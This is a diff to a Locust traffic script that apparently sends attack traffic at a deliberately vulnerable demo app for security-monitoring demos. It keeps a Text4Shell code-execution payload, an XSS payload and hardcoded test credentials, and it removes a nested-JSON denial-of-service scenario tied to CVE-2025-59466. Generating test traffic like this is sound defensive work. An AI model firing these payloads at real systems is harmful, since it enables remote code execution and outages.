@@ -43,8 +43,6 @@ TEXT4SHELL_PAYLOAD = (
     "${script:javascript:java.lang.Runtime.getRuntime().exec('id')}"
 )
 
-DOS_NESTED_DEPTH = 15000
-
 HEADERS = {"User-Agent": "dd-demo-traffic/1.0"}
 
 KEYCLOAK_TOKEN_URL = "/auth/realms/corndog/protocol/openid-connect/token"
@@ -53,18 +51,6 @@ KEYCLOAK_VALID_USERS = [
     {"username": "user", "password": "user123"},
 ]
 KEYCLOAK_CLIENT_ID = "corndog-web"
-
-
-def _nested_json(depth=DOS_NESTED_DEPTH):
-    """Build a deeply nested JSON object for DoS testing (CVE-2025-59466)."""
-    obj = {"value": "leaf"}
-    for _ in range(depth):
-        obj = {"rules": obj}
-    return obj
-
-
-# Cache the payload so we don't rebuild it on every request
-_DOS_PAYLOAD = _nested_json()
 
 
 def _extra_latency():
@@ -279,17 +265,6 @@ class CorndogUser(HttpUser):
             f"/api/loyalty/card?customer={XSS_PAYLOAD}",
             headers=HEADERS,
             name="GET /api/loyalty/card [xss]",
-        )
-
-    @task(1)
-    def scenario_dos_nested_json(self):
-        """DoS via deeply nested JSON — triggers CVE-2025-59466 stack overflow."""
-        self.client.post(
-            "/api/loyalty/validate-config",
-            json=_DOS_PAYLOAD,
-            headers=HEADERS,
-            name="POST /api/loyalty/validate-config [dos-nested-json]",
-            catch_response=True,
         )
 
     @task(1)
